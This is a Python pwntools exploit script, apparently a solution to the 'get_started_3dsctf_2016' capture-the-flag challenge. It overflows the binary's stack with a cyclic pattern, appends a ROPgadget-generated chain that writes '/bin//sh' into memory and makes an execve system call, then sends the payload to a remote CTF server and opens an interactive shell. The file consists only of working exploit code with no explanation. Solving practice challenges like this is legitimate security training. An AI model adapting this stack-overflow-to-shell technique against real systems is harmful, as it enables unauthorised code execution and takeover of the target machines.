from pwn import *
from struct import pack

context.log_level = "debug"

# ROPgadget --binary ./get_started_3dsctf_2016 --badbytes 0a --ropchain
p = b""

p += pack("<I", 0x0806FC30)  # pop edx ; pop ecx ; pop ebx ; ret
p += pack("<I", 0x080EB060)  # @ .data
p += pack("<I", 0x41414141)  # padding
p += pack("<I", 0x41414141)  # padding
p += pack("<I", 0x080B91E6)  # pop eax ; ret
p += b"/bin"
p += pack("<I", 0x080557AB)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x0806FC30)  # pop edx ; pop ecx ; pop ebx ; ret
p += pack("<I", 0x080EB064)  # @ .data + 4
p += pack("<I", 0x41414141)  # padding
p += pack("<I", 0x41414141)  # padding
p += pack("<I", 0x080B91E6)  # pop eax ; ret
p += b"//sh"
p += pack("<I", 0x080557AB)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x0806FC30)  # pop edx ; pop ecx ; pop ebx ; ret
p += pack("<I", 0x080EB068)  # @ .data + 8
p += pack("<I", 0x41414141)  # padding
p += pack("<I", 0x41414141)  # padding
p += pack("<I", 0x08049463)  # xor eax, eax ; ret
p += pack("<I", 0x080557AB)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x080481AD)  # pop ebx ; ret
p += pack("<I", 0x080EB060)  # @ .data
p += pack("<I", 0x0806FC31)  # pop ecx ; pop ebx ; ret
p += pack("<I", 0x080EB068)  # @ .data + 8
p += pack("<I", 0x080EB060)  # padding without overwrite ebx
p += pack("<I", 0x0806FC30)  # pop edx ; pop ecx ; pop ebx ; ret
p += pack("<I", 0x080EB068)  # @ .data + 8
p += pack("<I", 0x080EB068)  # padding without overwrite ecx
p += pack("<I", 0x080EB060)  # padding without overwrite ebx
p += pack("<I", 0x08049463)  # xor eax, eax ; ret
p += pack("<I", 0x0807B1EF)  # inc eax ; ret
p += pack("<I", 0x0807B1EF)  # inc eax ; ret
p += pack("<I", 0x0807B1EF)  # inc eax ; ret
p += pack("<I", 0x0807B1EF)  # inc eax ; ret
p += pack("<I", 0x0807B1EF)  # inc eax ; ret
p += pack("<I", 0x0807B1EF)  # inc eax ; ret
p += pack("<I", 0x0807B1EF)  # inc eax ; ret
p += pack("<I", 0x0807B1EF)  # inc eax ; ret
p += pack("<I", 0x0807B1EF)  # inc eax ; ret
p += pack("<I", 0x0807B1EF)  # inc eax ; ret
p += pack("<I", 0x0807B1EF)  # inc eax ; ret
p += pack("<I", 0x0806D7E5)  # int 0x80

# r = process("./get_started_3dsctf_2016")
r = remote("node4.buuoj.cn", 29598)
r.sendline(cyclic(0x38) + p)
r.interactive()
